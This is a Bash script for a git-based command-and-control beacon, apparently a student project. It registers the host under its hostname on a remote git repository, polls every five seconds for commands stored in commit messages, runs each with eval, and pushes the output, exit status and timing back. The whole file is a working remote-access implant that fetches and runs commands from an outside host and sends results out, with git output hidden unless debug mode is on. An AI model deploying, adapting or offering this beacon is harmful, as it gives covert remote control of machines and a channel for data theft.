#!/usr/bin/env bash
# Heavily uses bashisms, do not port to POSIX sh

log () {
	local level ansi

	level="${1}"
	shift
	case "${level}" in
		(fatal) ansi="41;30" ;;
		(err) ansi="31" ;;
		(warn) ansi="33" ;;
		(debug) ansi="90" ;;
		(*) ansi="45;30" ;;
	esac
	printf "\033[${ansi}m%s: %s: %s: %s\033[m\n" "${0}" "${FUNCNAME[2]}" "${BASH_LINENO[1]}" "$*" >&2
}

fatal () {
	log fatal "${@}"
}

err () {
	log err "${@}"
}

warn () {
	log warn "${@}"
}

debug () {
	log debug "${@}"
}

_grey () {
	printf '\033[90m' >&2
}

_rst () {
	printf '\033[m' >&2
}

# Remove temporary directory and cd back to a sane place
_cleanup () {
	printf '\n'
	if [ "${DEBUG}" = "on" ]
	then
		warn "Cleaning up..."
		_grey
			cd /
			rm -rfv -- "${tmpdir}" |& xargs || { err "error deleting tmpdir"; }
			cd -- "${orig_dir}" || cd || cd -- "${HOME}" || cd -- ~ || pwd
		_rst
	fi
	warn "Exiting"
}

# Override git command to make it DEBUG aware
git () {
	local subcomand
	declare -i status

	status="0"
	subcomand="${1}"
	[ -n "${subcomand}" ] || { command git; return 1; }
	shift
	if [ "${DEBUG}" = "on" ]
	then
		_grey
			1>&2 command git "${subcomand}" "${@}" ; status="${?}"
		_rst
		return "${status}"
	else
		2>/dev/null 1>&2 command git "${subcomand}" "${@}" ; status="${?}"
		return "${status}"
	fi
}

_check_ref () {
	git ls-remote --heads --exit-code c2 -- "${1}"
}

# Returns empty string if there is no next command
_fetch_next_command () {
	local next_id_file next_id stdin

	next_id_file="${1}"

	_check_ref "${BEACON_ID}" \
		|| { warn "Pull failed (ref '${BEACON_ID}' doesnt exist)"; return 1; }
	git pull c2 -- "${BEACON_ID}" \
		|| { warn "Pull failed"; return 1; }
	next_id="$(comm -23 <(command git log --author=in --format=%ae | sort) <(command git log --author=out --format=%ae | sort) | sort -n | head -1)"
	[ -n "${next_id}" ] || return 1
	printf '%s' "${next_id}" 1>| "${next_id_file:-next_id}"
	stdin="$(command git log -1 --author="${next_id}" --format=%s ; printf .)" ; stdin="${stdin%.}"
	printf '%s' "${stdin}"
	[ "${DEBUG}" = "on" ] && debug "${next_id@A}"
}

_send_result () {
	local stdin stdout_file stderr_file status pipestatus elapsed next_id_file next_id

	stdin="${1}"
	stdout_file="${2}"
	stderr_file="${3}"
	status="${4}"
	pipestatus="${5}"
	elapsed="${6}"
	next_id_file="${7}"

	next_id="$(cat -- "${next_id_file:-next_id}")"

	printf '%s' "${status}" 1>| status
	printf '%s' "${pipestatus}" 1>| pipestatus
	printf '%s' "${elapsed}" 1>| elapsed

	git add --force "${stdout_file:-stdout}" "${stderr_file:-stderr}" status pipestatus elapsed
	
	GIT_AUTHOR_NAME="out" GIT_AUTHOR_EMAIL="${next_id}" \
		git commit --allow-empty --message="${stdin}"

	git reset --hard
	git clean -df

	git push c2 -- "${BEACON_ID}" \
		|| { warn "Push failed"; return 1; }
}

# TODO: Make asynchronous, you don't want to lose the
# connection when you send a blocking/neverending command
_fetch_eval () {
	unset pipestatus
	local cmd status pipestatus elapsed

	cmd="$(_fetch_next_command next_id ; printf .)" ; cmd="${cmd%.}"
	[ "${DEBUG}" = "on" ] && { debug "${cmd@A}"; : return 1; }
	[ -n "${cmd}" ] || return 1
	SECONDS="0"
	eval "${cmd}"$'\npipestatus=("${PIPESTATUS[@]}")' 1>| stdout 2>| stderr
	status="${pipestatus[-1]}"
	elapsed="${SECONDS}"
	_send_result "${cmd}" stdout stderr "${status}" "${pipestatus[*]@A}" "${elapsed}" next_id
}

init () {
	trap _cleanup EXIT

	C2="git@vogsphere.42berlin.de:vogsphere/intra-uuid-17a60d50-65e8-4462-b546-c09f7a20c21c-5663399-tischmid"
	BEACON_ID="$(hostname -s)" || BEACON_ID="${HOSTNAME%%.*}"
	[ -n "${BEACON_ID}" ] || { err "error setting beacon id"; exit 1; }
	POLL_RATE="5"
	unset CDPATH

	tmpdir="$(mktemp -d -p /tmp .gitc2beaconXXXXXXXXX)" || { err "error creating tmpdir"; exit 1; }
	orig_dir="$(pwd)" || { warn "error changing to tmpdir (not exiting)"; }
	cd -- "${tmpdir}" || { err "error changing to tmpdir"; exit 1; }

	git init
	git remote add c2 -- "${C2}"
	if _check_ref "${BEACON_ID}"
	then
		git pull c2 -- "${BEACON_ID}"
		git switch -- "${BEACON_ID}"
	elif _check_ref main
	then
		git pull c2 main
		git branch -- "${BEACON_ID}"
		git switch -- "${BEACON_ID}"
	else
		git branch --move -- "${BEACON_ID}"
	fi
	[ "$(command git branch --show-current)" = "${BEACON_ID}" ] || { fatal "Failed to be on '${BEACON_ID}' branch! Exiting."; exit 1; }
	if [ "${DEBUG}" = "on" ]
	then
		_grey
			pwd
			ls -al
			printf '%s\n' "${C2@A}"
			printf '%s\n' "${BEACON_ID@A}"
			printf '%s\n' "${POLL_RATE@A}"
			printf '\n'
		_rst
	fi
}

loop () {
	while :
	do
		_fetch_eval
		sleep "${POLL_RATE}s"
	done
}

main () {
	init
	loop
}

main
